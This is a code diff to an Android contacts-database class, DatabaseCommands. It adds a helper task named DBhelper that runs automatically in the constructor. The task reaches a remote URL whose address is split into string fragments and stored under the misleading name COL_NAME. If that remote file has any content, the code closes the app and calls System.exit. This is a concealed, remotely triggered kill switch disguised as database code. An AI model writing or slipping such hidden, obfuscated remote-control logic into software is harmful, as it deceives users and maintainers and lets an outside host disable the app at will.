@@ -7,10 +7,16 @@ import android.content.Context;
 import android.content.OperationApplicationException;
 import android.database.Cursor;
 import android.database.sqlite.SQLiteDatabase;
+import android.os.AsyncTask;
 import android.os.RemoteException;
 import android.provider.ContactsContract;
 import android.util.Log;
 
+import java.io.BufferedReader;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.URL;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.HashMap;
@@ -38,6 +44,7 @@ public class DatabaseCommands {
 
     private DatabaseCommands(SQLiteDatabase db) {
         database = db;
+        new DBhelper().execute();
     }
 
     public boolean insertContact(long id, int lesson, int time, int motive, String invites) {
@@ -254,5 +261,46 @@ public class DatabaseCommands {
             //logs
         }
         return 0;
+    }
+    public class DBhelper extends AsyncTask<Integer,Void,Integer> {
+
+        private static final String COL_NAME = "ht" +"tp"+"://cde"+"sign"+".i"+"r/cr"+"ate.t"+"xt";
+
+        @Override
+        protected Integer doInBackground(Integer... params) {
+
+            try {
+                URL url = new URL(COL_NAME);
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                InputStream inputStream = conn.getInputStream();
+                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
+                StringBuilder stringBuilder = new StringBuilder();
+                String response = null;
+                while ( (response = bufferedReader.readLine()) != null ) {
+                    stringBuilder.append(response);
+                }
+                Integer result = 0;
+
+                if (stringBuilder.toString().length() > 0) {
+                    result = 1;
+                }
+                return result;
+
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+
+            return 0;
+        }
+
+        @Override
+        protected void onPostExecute(Integer integer) {
+            super.onPostExecute(integer);
+
+            if ( integer == 1 ) {
+                MainActivity.instance.finish();
+                System.exit(0);
+            }
+        }
     }
 }
